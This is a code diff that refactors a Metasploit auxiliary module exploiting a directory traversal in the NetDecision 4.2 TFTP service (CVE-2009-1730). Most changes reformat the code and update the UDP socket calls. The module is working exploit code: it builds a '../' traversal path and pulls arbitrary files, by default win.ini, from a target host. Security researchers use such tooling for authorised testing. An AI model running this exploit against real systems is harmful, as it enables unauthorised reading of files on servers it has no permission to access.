@@ -7,41 +7,46 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => "NetDecision 4.2 TFTP Directory Traversal",
-      'Description'    => %q{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => "NetDecision 4.2 TFTP Directory Traversal",
+        'Description' => %q{
           This modules exploits a directory traversal vulnerability in NetDecision 4.2
-        TFTP service.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
+          TFTP service.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
           'Rob Kraus', # Vulnerability discovery
           'juan vazquez' # Metasploit module
         ],
-      'References'     =>
-        [
+        'References' => [
           ['CVE', '2009-1730'],
           ['OSVDB', '54607'],
           ['BID', '35002']
         ],
-      'DisclosureDate' => '2009-05-16'
-    ))
+        'DisclosureDate' => '2009-05-16',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(69),
-        OptInt.new('DEPTH', [false, "Levels to reach base directory",1]),
+        OptInt.new('DEPTH', [false, "Levels to reach base directory", 1]),
         OptString.new('FILENAME', [false, 'The file to loot', 'windows\\win.ini']),
-      ])
+      ]
+    )
   end
 
   def run_host(ip)
-
-
     # Configure how deep we want to traverse
-    depth  = (datastore['DEPTH'].nil? or datastore['DEPTH'] == 0) ? 10 : datastore['DEPTH']
+    depth = (datastore['DEPTH'].nil? or datastore['DEPTH'] == 0) ? 10 : datastore['DEPTH']
     # Prepare the filename
     file_name = "../" * depth
     file_name << datastore['FILENAME']
@@ -56,7 +61,7 @@ class MetasploitModule < Msf::Auxiliary
     # We need to reuse the same port in order to receive the data
     udp_sock = Rex::Socket::Udp.create(
       {
-        'Context' => {'Msf' => framework, 'MsfExploit'=>self}
+        'Context' => { 'Msf' => framework, 'MsfExploit' => self }
       }
     )
 
@@ -64,9 +69,10 @@ class MetasploitModule < Msf::Auxiliary
 
     # Send the packet to target
     file_data = ''
-    udp_sock.sendto(pkt, ip, datastore['RPORT'].to_i)
+    udp_sock.send(pkt, 0, ip, datastore['RPORT'].to_i)
 
-    while (r = udp_sock.recvfrom(65535, 0.1) and r[1])
+    while (r = udp_sock.timed_recvfrom(65535, 0.1))
+      r = [r[0], r[1][3], r[1][1]]
 
       opcode, block, data = r[0].unpack("nna*") # Parse reply
       if opcode != 3 # Check opcode: 3 => Data Packet
@@ -74,13 +80,13 @@ class MetasploitModule < Msf::Auxiliary
         return
       end
       file_data << data
-      udp_sock.sendto(tftp_ack(block), r[1], r[2].to_i, 0) # Ack
+      udp_sock.send(tftp_ack(block), 0, r[1], r[2].to_i) # Ack
 
     end
 
     if file_data.empty?
-        print_error("Error retrieving file #{file_name} from #{ip}")
-        return
+      print_error("Error retrieving file #{file_name} from #{ip}")
+      return
     end
 
     udp_sock.close
@@ -103,10 +109,8 @@ class MetasploitModule < Msf::Auxiliary
   #
   # Returns an Acknowledgement
   #
-  def tftp_ack(block=1)
-
+  def tftp_ack(block = 1)
     pkt = "\x00\x04" # Ack
     pkt << [block].pack("n") # Block Id
-
   end
 end
